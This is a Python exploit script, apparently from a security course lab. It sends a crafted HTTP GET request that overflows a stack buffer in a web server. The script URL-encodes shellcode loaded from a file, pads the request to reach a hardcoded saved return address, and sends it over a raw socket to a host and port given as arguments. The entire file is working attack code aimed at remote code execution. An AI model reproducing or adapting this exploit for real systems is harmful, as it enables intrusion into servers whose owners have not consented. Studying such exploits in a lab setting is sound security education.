#!/usr/bin/env python3

import sys
import socket
import traceback
import urllib.parse
import struct

stack_buffer = 0x7fffffffdc90
stack_retaddr = 0x7fffffffeca8
shellcode_addr = stack_buffer + 5

def build_exploit(shellcode: bytes) -> bytes:
    retid = stack_retaddr - stack_buffer
    pl_len = retid + 2
    sc_as_url = urllib.parse.quote_from_bytes(shellcode).encode('ascii')
    pl = sc_as_url + \
        ("a" * (pl_len - len(sc_as_url) - 8)).encode('ascii')
    pl += urllib.parse.quote_from_bytes(struct.pack("<Q", 0x20)).\
        encode('ascii')
    pl += b'\x00'
    req = bytes("GET /", "ascii") + pl
    print(len(req))
    return req

def send_req(host: str, port: int, req: bytes) -> bytes:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    print("Connecting to %s:%d..." % (host, port))
    sock.connect((host, port))

    print("Connected, sending request...")
    sock.send(req)

    print("Request sent, waiting for reply...")
    rbuf = sock.recv(1024)
    resp = b""

    while len(rbuf):
        resp = resp + rbuf
        rbuf = sock.recv(1024)

    print("Received reply.")
    sock.close()
    return resp

if len(sys.argv) != 3:
    print("Usage: " + sys.argv[0] + " host port")
    exit()

try:
    shellfile = open("shellcode.bin", "rb")
    shellcode = shellfile.read()
    req = build_exploit(shellcode)
    print("HTTP request:")
    print(req)

    resp = send_req(sys.argv[1], int(sys.argv[2]), req)
    print("HTTP response:")
    print(resp)
except:
    print("Exception:")
    print(traceback.format_exc())

